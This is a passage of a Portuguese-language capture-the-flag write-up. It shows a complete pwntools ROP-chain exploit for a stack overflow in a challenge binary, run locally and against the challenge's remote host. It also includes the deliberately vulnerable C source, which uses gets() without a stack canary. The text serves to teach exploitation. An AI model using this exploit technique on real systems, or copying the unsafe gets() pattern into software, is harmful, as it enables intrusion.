reisraff@3dbbde46a935:~/workdir/challs/port-65144$ sudo mkdir -p /code/ROP-me/
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ echo "FLAG TEST" | sudo tee /code/ROP-me/flag.txt
FLAG TEST
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ cat /code/ROP-me/flag.txt
FLAG TEST
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ sudo chmod 777 -R /code
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ls /code/ROP-me/flag.txt  -l
-rwxrwxrwx 1 root root 10 Aug 31 22:08 /code/ROP-me/flag.txt
```

Agora passamos para a próxima etapa, vamos lembrar como era a função:

<center><img src="post-assets/port-65144-ghidra-1.png" width="732" alt="ghidra" /></center>

OK, as duas primeiras condições eu acho que vão passar, e a última depende do valor param1 que deve ser um valor que ao subtrair `0x01` dele, deve ser igual a `0x01`. Por que `0x01` porque acabei de printar:

```
gef➤  x/x 0x0804c035
0x804c035:  0x00000001
```

Qual valor subtraindo 1 é igual a 1? Este eu vou deixar você encontrar sozinho!

Agora que temos 3 argumentos, precisaremos de um `pop; pop; pop; ret; `, então o exploit final é:

```python
#!/usr/bin/env python
import pwn

# pwn.context.log_level = 'debug'

poppopret = pwn.p32(0x080494a2)  # gadgets try ROPgadget
poppoppopret = pwn.p32(0x080494a1)  # gadgets try ROPgadget

f1 = pwn.p32(0x8049256)     # func1 address
f1arg1 = pwn.p32(0x9c)      # 1st argument of func1
f1arg2 = pwn.p32(300)       # 2nd argument of func1

f2 = pwn.p32(0x804929e)     # func2 address
f2arg1 = pwn.p32(0x0)       # 1st argument of func2
f2arg2 = pwn.p32(0xd)       # 2nd argument of func2
f2arg3 = pwn.p32(0xd)       # 3rd argument of func2

flag = pwn.p32(0x80492fc)   # func3 address
f3arg1 = pwn.p32(??)        # 1st argument of func3

buff = 'A' * 172             # our buffer with 172 A

"""
Now we put all together
buffer + func1 address + poppopret + 1st arg f1 + 2nd arg f1
+ func2 address + poppoppopret + 1st arg f2 + 2nd arg f2 + 3rd arg f2
+ func3 address + JUNK + 1st arg f3

"""
payload = buff.encode() \
    + f1 \
    + poppopret \
    + f1arg1 \
    + f1arg2 \
    + f2 \
    + poppoppopret \
    + f2arg1 \
    + f2arg2 \
    + f2arg3 \
    + flag \
    + 'JUNK'.encode() \
    + f3arg1

open('payload.txt', 'w').write(payload.decode('iso-8859-1'))

elf = pwn.ELF('./port-65144')
p = elf.process()
p.sendline(payload)

print('=========================')
print('what the process returned')
print(p.recv().decode())
```

A saída:

```
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 2370
=========================
what the process returned
[*] Process '/home/reisraff/workdir/challs/port-65144/port-65144' stopped with exit code 0 (pid 2370)
Enter your buffer: gotcha func1
gotcha func2
FLAG TEST
```

Agora temos que executar remotamente, já que o nome binário é port-65144, vamos tentar esta porta:

```python
# ...
p = pwn.remote('173.230.139.237', '65144')
# ...
```

saída:

```
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 2375
[+] Opening connection to 173.230.139.237 on port 65144: Done
=========================
what the process returned
Enter your buffer: gotcha func1
gotcha func2
reisraff{D47a_3xecu710n_Pr3ven71on_owned}

```

O código-fonte deste desafio é:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sys/mman.h>

bool flag1 = false;
bool flag2 = false;

void func1(int num1, int num2) {
    if (156 == num1 && 300 == num2) {
        flag1 = true;
        puts("gotcha func1");
    }
}

void func2(int num1, int num2, int num3) {
    if (flag1 && !num1 && 13 == num2 && (num1 + num2) == num3) {
        flag2 = true;
        puts("gotcha func2");
    }
}

void flag(int num1) {
    int fd = open("/code/ROP-me/flag.txt", O_RDONLY);
    int len = lseek(fd, 0, SEEK_END);
    void *data = mmap(0, len, PROT_READ, MAP_PRIVATE, fd, 0);

    if (flag1 && flag2 && (num1 - flag1) == flag2) {
        printf("%s", data);
        exit(0);
    }
}

void vuln() {
    char buffer[160];

    printf("Enter your buffer: ");
    gets(buffer);
}

int main() {
    vuln();

    puts("not this time");

    return 1;
}

```

E eu compilo assim:

```bash
gcc -o program program.c -m32 -no-pie -w -fno-stack-protector
# Then I strip
strip program
# And then I set it up with socat to run in the por 65144
socat TCP4-LISTEN:65144,reuseaddr,fork EXEC:./program &
```
